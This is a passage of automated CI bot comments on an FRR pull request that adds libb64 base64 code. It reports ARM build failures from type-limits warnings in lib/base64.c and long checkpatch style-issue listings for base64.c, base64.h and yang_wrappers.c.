https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\n</details>\n\n    <stdin>:281: new blank line at EOF.\n    +\n    warning: 1 line adds whitespace errors.\n    Report for base64.c | 93 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-8724/base64.c:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #10: FILE: /tmp/f1-8724/base64.c:10:\n    +void base64_init_encodestate(base64_encodestate* state_in)\n    \n    WARNING: line over 80 characters\n    #19: FILE: /tmp/f1-8724/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #19: FILE: /tmp/f1-8724/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: Missing a blank line after declarations\n    #20: FILE: /tmp/f1-8724/base64.c:20:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    +\tif (value_in > 63) return '=';\n    \n    ERROR: trailing statements should be on next line\n    #20: FILE: /tmp/f1-8724/base64.c:20:\n    +\tif (value_in > 63) return '=';\n    \n    WARNING: line over 80 characters\n    #24: FILE: /tmp/f1-8724/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-8724/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-8724/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-8724/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-8724/base64.c:26:\n    +\tconst char* plainchar = plaintext_in;\n    \n    ERROR: \"foo* const bar\" should be \"foo * const bar\"\n    #27: FILE: /tmp/f1-8724/base64.c:27:\n    +\tconst char* const plaintextend = plaintext_in + length_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-8724/base64.c:28:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #34: FILE: /tmp/f1-8724/base64.c:34:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #36: FILE: /tmp/f1-8724/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #36: FILE: /tmp/f1-8724/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #39: FILE: /tmp/f1-8724/base64.c:39:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #50: FILE: /tmp/f1-8724/base64.c:50:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #61: FILE: /tmp/f1-8724/base64.c:61:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #74: FILE: /tmp/f1-8724/base64.c:74:\n    +\t\t\tif (state_in->stepcount == CHARS_PER_LINE/4)\n    +\t\t\t{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #85: FILE: /tmp/f1-8724/base64.c:85:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #85: FILE: /tmp/f1-8724/base64.c:85:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-8724/base64.c:87:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #89: FILE: /tmp/f1-8724/base64.c:89:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #112: FILE: /tmp/f1-8724/base64.c:112:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-8724/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-8724/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-8724/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-8724/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-8724/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #113: FILE: /tmp/f1-8724/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #113: FILE: /tmp/f1-8724/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                    ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #113: FILE: /tmp/f1-8724/base64.c:113:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                     ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-8724/base64.c:114:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                   ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-8724/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-8724/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-8724/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-8724/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t          ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-8724/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-8724/base64.c:115:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-8724/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-8724/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-8724/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-8724/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-8724/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-8724/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-8724/base64.c:116:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-8724/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-8724/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-8724/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-8724/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-8724/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-8724/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-8724/base64.c:117:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-8724/base64.c:118:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-8724/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-8724/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-8724/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-8724/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-8724/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-8724/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-8724/base64.c:119:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-8724/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-8724/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-8724/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-8724/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-8724/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-8724/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-8724/base64.c:120:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-8724/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-8724/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-8724/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-8724/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-8724/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-8724/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-8724/base64.c:121:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                    ^\n    \n    WARNING: Missing a blank line after declarations\n    #124: FILE: /tmp/f1-8724/base64.c:124:\n    +\tstatic const char decoding_size = sizeof(decoding);\n    +\tvalue_in -= 43;\n    \n    ERROR: trailing statements should be on next line\n    #125: FILE: /tmp/f1-8724/base64.c:125:\n    +\tif (value_in < 0 || value_in >= decoding_size) return -1;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #129: FILE: /tmp/f1-8724/base64.c:129:\n    +void base64_init_decodestate(base64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #135: FILE: /tmp/f1-8724/base64.c:135:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #135: FILE: /tmp/f1-8724/base64.c:135:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #136: FILE: /tmp/f1-8724/base64.c:136:\n    +\t\t\tbase64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #138: FILE: /tmp/f1-8724/base64.c:138:\n    +\tconst char* codechar = code_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #139: FILE: /tmp/f1-8724/base64.c:139:\n    +\tchar* plainchar = plaintext_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #144: FILE: /tmp/f1-8724/base64.c:144:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #146: FILE: /tmp/f1-8724/base64.c:146:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #146: FILE: /tmp/f1-8724/base64.c:146:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #150: FILE: /tmp/f1-8724/base64.c:150:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #156: FILE: /tmp/f1-8724/base64.c:156:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    \n    ERROR: that open brace { should be on the previous line\n    #161: FILE: /tmp/f1-8724/base64.c:161:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #167: FILE: /tmp/f1-8724/base64.c:167:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    \n    ERROR: that open brace { should be on the previous line\n    #173: FILE: /tmp/f1-8724/base64.c:173:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #179: FILE: /tmp/f1-8724/base64.c:179:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    \n    ERROR: that open brace { should be on the previous line\n    #185: FILE: /tmp/f1-8724/base64.c:185:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    WARNING: line over 80 characters\n    #191: FILE: /tmp/f1-8724/base64.c:191:\n    +\t\t\t\tfragment = (char)base64_decode_value(*codechar++);\n    Report for base64.h | 85 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-8724/base64.h:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    WARNING: do not add new typedefs\n    #9: FILE: /tmp/f1-8724/base64.h:9:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #10: FILE: /tmp/f1-8724/base64.h:10:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #14: FILE: /tmp/f1-8724/base64.h:14:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #15: FILE: /tmp/f1-8724/base64.h:15:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #21: FILE: /tmp/f1-8724/base64.h:21:\n    +void base64_init_encodestate(base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-8724/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-8724/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-8724/base64.h:26:\n    +\t\t\tbase64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-8724/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-8724/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    WARNING: do not add new typedefs\n    #31: FILE: /tmp/f1-8724/base64.h:31:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #32: FILE: /tmp/f1-8724/base64.h:32:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #36: FILE: /tmp/f1-8724/base64.h:36:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #37: FILE: /tmp/f1-8724/base64.h:37:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #42: FILE: /tmp/f1-8724/base64.h:42:\n    +void base64_init_decodestate(base64_decodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-8724/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-8724/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #47: FILE: /tmp/f1-8724/base64.h:47:\n    +\t\t\tbase64_decodestate* state_in);\n    \n    WARNING: C99 // comments do not match recommendation\n    #49: FILE: /tmp/f1-8724/base64.h:49:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-8724/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #692: FILE: /tmp/f1-8724/yang_wrappers.c:692:\n    < WARNING: Missing a blank line after declarations\n    < #697: FILE: /tmp/f1-8724/yang_wrappers.c:697:\n    < WARNING: Missing a blank line after declarations\n    < #710: FILE: /tmp/f1-8724/yang_wrappers.c:710:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Failed\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:197:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3564/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3564/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:159:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:171:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:184:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    